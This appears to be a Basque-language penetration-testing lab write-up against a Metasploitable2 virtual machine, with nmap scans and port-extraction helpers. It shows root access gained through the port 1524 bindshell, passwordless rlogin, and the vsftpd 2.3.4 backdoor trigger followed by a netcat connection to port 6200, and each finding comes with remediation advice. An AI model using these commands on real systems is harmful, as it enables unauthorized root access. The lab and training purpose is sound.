
Portu eskaneoa
```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP> -oG allPorts
```

```
sudo apt update && sudo apt install xclip -y
```


```
nano ~/.zshrc
```


```
# Extract nmap information
function extractPorts(){
    ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
    ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
    echo -e "\n\033[1;33m[*]\033[0m Extracting information...\n" > extractPorts.tmp
    echo -e "\t\033[1;34m[*]\033[0m IP Address: \033[1;31m$ip_address\033[0m"  >> extractPorts.tmp
    echo -e "\t\033[1;34m[*]\033[0m Open ports: \033[1;31m$ports\033[0m\n"  >> extractPorts.tmp
    echo $ports | tr -d '\n' | xclip -sel clip
    echo -e "\033[1;33m[*]\033[0m Ports copied to clipboard\n"  >> extractPorts.tmp
    cat extractPorts.tmp; rm extractPorts.tmp
}
```

```
source ~/.zshrc
```

```
┌──(kali㉿kali)-[~]
└─$ extractPorts allPorts 

[*] Extracting information...

        [*] IP Address: 10.0.2.4
        [*] Open ports: 21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787,36106,36766,55747,60942

[*] Ports copied to clipboard
```

```
──(kali㉿kali)-[~]
└─$ nmap -sCV -p21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787,36106,36766,55747,60942 10.0.2.4 -oN targeted

```

```
┌──(kali㉿kali)-[~]
└─$ cat targeted 
# Nmap 7.98 scan initiated Wed Apr  1 05:13:19 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p21,22,23,25,53,80,111,139,445,512,513,514,1099,1524,2049,2121,3306,3632,5432,5900,6000,6667,6697,8009,8180,8787,36106,36766,55747,60942 -oN targeted 10.0.2.4
Nmap scan report for 10.0.2.4
Host is up (0.00061s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
|_ssl-date: 2026-04-01T09:15:38+00:00; 0s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
53/tcp    open  domain      ISC BIND 9.4.2
| dns-nsid: 
|_  bind.version: 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      36106/tcp   mountd
|   100005  1,2,3      53876/udp   mountd
|   100021  1,3,4      50333/udp   nlockmgr
|   100021  1,3,4      55747/tcp   nlockmgr
|   100024  1          36766/tcp   status
|_  100024  1          43768/udp   status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
| mysql-info: 
|   Protocol: 10
|   Version: 5.0.51a-3ubuntu5
|   Thread ID: 9
|   Capabilities flags: 43564
|   Some Capabilities: Support41Auth, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, SupportsTransactions, SupportsCompression, LongColumnFlag, ConnectWithDatabase
|   Status: Autocommit
|_  Salt: bq5NlS<rITISFBYwl9vh
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
|_ssl-date: 2026-04-01T09:15:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
| Not valid before: 2010-03-17T14:07:45
|_Not valid after:  2010-04-16T14:07:45
5900/tcp  open  vnc         VNC (protocol 3.3)
| vnc-info: 
|   Protocol version: 3.3
|   Security types: 
|_    VNC Authentication (2)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|   server: irc.Metasploitable.LAN
|   version: Unreal3.2.8.1. irc.Metasploitable.LAN 
|   uptime: 0 days, 0:19:48
|   source ident: nmap
|   source host: C29CBC04.EB72D3BE.7B559A54.IP
|_  error: Closing Link: lriauvzmw[10.0.2.15] (Quit: lriauvzmw)
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/5.5
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
36106/tcp open  mountd      1-3 (RPC #100005)
36766/tcp open  status      1 (RPC #100024)
55747/tcp open  nlockmgr    1-4 (RPC #100021)
60942/tcp open  java-rmi    GNU Classpath grmiregistry
MAC Address: 08:00:27:CA:94:CC (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h00m00s, deviation: 2h00m00s, median: 0s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: metasploitable.localdomain
|_  System time: 2026-04-01T05:15:28-04:00
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr  1 05:15:39 2026 -- 1 IP address (1 host up) scanned in 139.48 seconds
                                       
```

# Ahultasunak

1524 portuan root shell-a dela esaten du(1524/tcp  open  bindshell   Metasploitable root shell), ondorioz, netcat egingo diogu portuari

```
┌──(kali㉿kali)-[~]
└─$ nc 10.0.2.4 1524           
root@metasploitable:/# whoami
root
```

Beste portu bertsio guztiak begiratu interneten 

- 512, 513, 514 portuak zerbitzu zaharrak dituzte eta batzutan ez dute pazahitza eskatzen.
```
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ rlogin -l root 10.0.2.4
Last login: Tue Apr  7 14:40:44 EDT 2026 from 10.0.2.15 on pts/1
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
You have mail.
root@metasploitable:~# whoami
root
root@metasploitable:~# 
```

- 21 portua ahultasun bat du, 
```
┌──(kali㉿kali)-[~]
└─$ nc 10.0.2.4 21
220 (vsFTPd 2.3.4)
user user:)
331 Please specify the password.
PASS 12345 
```

hau egin eta gero beste terminal batean
```
┌──(kali㉿kali)-[~]
└─$ nc 10.0.2.4 6200
whoami
root
```

# Galderen erantzuna (prozedura berdina erabilita)

## 1) 1524/tcp - bindshell root

### Zer informazio lortu dugu eta zergatik da ahultasuna?
- `nmap -sCV`-n agertzen da: `1524/tcp open bindshell Metasploitable root shell`.
- Hau kritikoa da, portura konektatze hutsarekin shell bat ematen duelako.

### Nola ustiatu dugu?
```
nc 10.0.2.4 1524
whoami
```

### Emaitza
- `root` jaso dugu zuzenean.
- Zerbitzariaren kontrol osoa lortu da.

### Gomendioak
- Zerbitzu hori desgaitu eta startup-etik kendu.
- Portu 1524 firewall bidez itxi.
- Sarbidea segmentazioz mugatu (VPN edo admin host jakin batetik bakarrik).

## 2) 21/tcp - vsFTPd 2.3.4 backdoor

### Zer informazio lortu dugu eta zergatik da ahultasuna?
- `nmap`-ek `vsftpd 2.3.4` erakusten du 21 portuan.
- Proban ikusi da `user user:)` bidali ondoren 6200 portuan root shell-a irekitzen dela.

### Nola ustiatu dugu?
```
nc 10.0.2.4 21
user user:)
```

Ondoren:

```
nc 10.0.2.4 6200
whoami
```

### Emaitza
- Root shell-a ireki da.
- Urrunetik root baimenak lortu dira.

### Gomendioak
- vsFTPd 2.3.4 kendu eta bertsio segurura eguneratu.
- FTP desgaitu edo SFTP-ra migratu.
- 21 eta 6200 portuak itxi edo mugatu firewall bidez.
- Auditoretza eta monitorizazioa aktibatu (log susmagarriak detektatzeko).